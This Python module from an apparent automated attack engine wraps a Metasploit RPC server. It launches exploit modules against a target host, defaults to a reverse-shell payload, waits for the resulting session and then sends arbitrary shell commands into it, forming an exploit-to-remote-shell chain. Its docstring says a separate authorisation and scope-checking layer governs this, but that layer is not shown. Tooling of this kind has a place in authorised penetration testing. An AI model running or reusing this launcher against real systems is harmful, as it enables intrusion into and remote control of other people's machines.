"""Metasploit RPC backend + exploit→session launcher (O2→O3, real transport).

The prototype ran a one-shot ``msfconsole`` in a ``--rm`` container and scraped
stdout for "session opened" — a session that died the instant the container
exited and was never registered. This replaces that with a **persistent
msfrpcd** integration: an exploit module is executed over RPC, the server holds
the resulting session across calls, and the engine drives it through the
:class:`~attack_engine.c2.backend.C2Backend` contract.

Layers, so the network is isolated and everything else is unit-testable:

    * :class:`MsfRpcClient` — the tiny RPC surface we use (Protocol). The real
      :class:`Pymetasploit3Client` implements it via ``pymetasploit3`` and is the
      only integration-only, network-touching code (never hit by the suite).
    * :class:`MsfRpcBackend` — a ``C2Backend`` that routes to a session by its
      ``msf_session_id`` (carried in ``Session.metadata``).
    * :class:`MsfFootholdLauncher` — runs the exploit, and on a real session hands
      off to the :class:`~attack_engine.c2.foothold.FootholdRunner` to register +
      prove it. This is the real "exploit → live session → whoami" chain, and the
      path on which RCE impact-proof is delivered.

All of it stays inside the envelope: the FootholdRunner authorises, scope-checks,
audits, and can tear the session down.
"""

from __future__ import annotations

import contextlib
from typing import Protocol, runtime_checkable

from ..logging import get_logger
from .foothold import Foothold, FootholdRunner
from .session import Session, SessionKind

_log = get_logger("c2.msf")

#: Where the msfrpcd session id is stashed on a registered Session.
MSF_SESSION_KEY = "msf_session_id"


@runtime_checkable
class MsfRpcClient(Protocol):
    """The subset of the Metasploit RPC API the engine actually uses."""

    def run_exploit(
        self, *, module: str, target: str, payload: str, options: dict[str, object]
    ) -> str | None:
        """Run an exploit module; return the new session id, or None if none opened."""
        ...

    def run_shell_command(self, session_id: str, command: str) -> str:
        """Run one command in a session and return its (bounded) output."""
        ...

    def session_alive(self, session_id: str) -> bool: ...

    def stop_session(self, session_id: str) -> None: ...


class MsfRpcBackend:
    """A :class:`C2Backend` over a persistent msfrpcd, routed by ``msf_session_id``."""

    def __init__(self, client: MsfRpcClient) -> None:
        self._client = client

    @staticmethod
    def _sid(session: Session) -> str | None:
        return session.metadata.get(MSF_SESSION_KEY)

    def alive(self, session: Session) -> bool:
        sid = self._sid(session)
        return self._client.session_alive(sid) if sid else False

    def run_command(self, session: Session, command: str) -> str:
        sid = self._sid(session)
        return self._client.run_shell_command(sid, command) if sid else ""

    def close(self, session: Session) -> None:
        sid = self._sid(session)
        if sid:
            self._client.stop_session(sid)


class MsfFootholdLauncher:
    """Runs an exploit over RPC and turns a real session into a proven Foothold."""

    def __init__(self, runner: FootholdRunner, client: MsfRpcClient) -> None:
        self._runner = runner
        self._client = client

    def launch(
        self,
        target: str,
        *,
        module: str,
        payload: str = "cmd/unix/reverse",
        options: dict[str, object] | None = None,
        kind: SessionKind = SessionKind.SHELL,
        listener_id: str | None = None,
        technique: str = "T1210",
    ) -> Foothold | None:
        """Exploit ``target`` and, if a session opens, register + prove it.

        Returns None if the exploit opened no session or authorization denied the
        foothold. The FootholdRunner's backend must be the :class:`MsfRpcBackend`
        wrapping the same client, so proof commands reach the new session.
        """

        sid = self._client.run_exploit(
            module=module, target=target, payload=payload, options=options or {}
        )
        if not sid:
            _log.info("exploit opened no session", module=module, target=target)
            return None
        _log.info("exploit opened msf session", module=module, target=target, sid=sid)
        return self._runner.establish(
            target,
            kind=kind,
            opened_by=module,
            listener_id=listener_id,
            technique=technique,
            metadata={MSF_SESSION_KEY: sid},
        )


class Pymetasploit3Client:  # pragma: no cover - integration-only, network transport
    """Real :class:`MsfRpcClient` over ``pymetasploit3``. Never hit by the suite.

    Constructed against a running ``msfrpcd``. Import is lazy so the dependency is
    only needed where a real C2 is deployed.
    """

    def __init__(self, password: str, *, host: str = "127.0.0.1", port: int = 55553,
                 ssl: bool = True) -> None:
        from pymetasploit3.msfrpc import MsfRpcClient as _Client

        self._rpc = _Client(password, server=host, port=port, ssl=ssl)

    def run_exploit(
        self, *, module: str, target: str, payload: str, options: dict[str, object]
    ) -> str | None:
        exploit = self._rpc.modules.use("exploit", module)
        exploit["RHOSTS"] = target
        for key, value in options.items():
            exploit[key] = value
        before = set(self._rpc.sessions.list.keys())
        exploit.execute(payload=payload)
        # Poll for a new session, then let it SETTLE: an exploit can briefly
        # register a transient session before the stable one lands, so we wait a
        # beat and return the newest session that is still alive — avoiding a
        # race where we hand back an id that closes before the first command.
        import time

        for _ in range(20):
            new = set(self._rpc.sessions.list.keys()) - before
            if new:
                time.sleep(1.5)
                live = new & set(self._rpc.sessions.list.keys())
                if not live:
                    before = set(self._rpc.sessions.list.keys())
                    continue
                return str(max(live, key=lambda s: int(s) if str(s).isdigit() else 0))
            time.sleep(0.5)
        return None

    def run_shell_command(self, session_id: str, command: str) -> str:
        import time

        session = self._rpc.sessions.session(session_id)
        # Flush any stale/banner output first so this command's output is clean
        # (a raw bind/reverse shell has no prompt to synchronise on).
        with contextlib.suppress(Exception):
            session.read()
        session.write(command + "\n")
        buf = ""
        # Poll a few short reads: a fresh shell often needs a beat before output
        # lands, and a single 0.5s read intermittently returns empty.
        for _ in range(8):
            time.sleep(0.4)
            try:
                chunk = session.read()
            except Exception:  # transient msfrpc read hiccup (no 'data' key)
                chunk = ""
            if chunk:
                buf += chunk if isinstance(chunk, str) else chunk.decode("utf-8", "replace")
            if buf.strip():
                break
        return buf.strip()

    def session_alive(self, session_id: str) -> bool:
        return session_id in self._rpc.sessions.list

    def stop_session(self, session_id: str) -> None:
        with contextlib.suppress(Exception):
            self._rpc.sessions.session(session_id).stop()
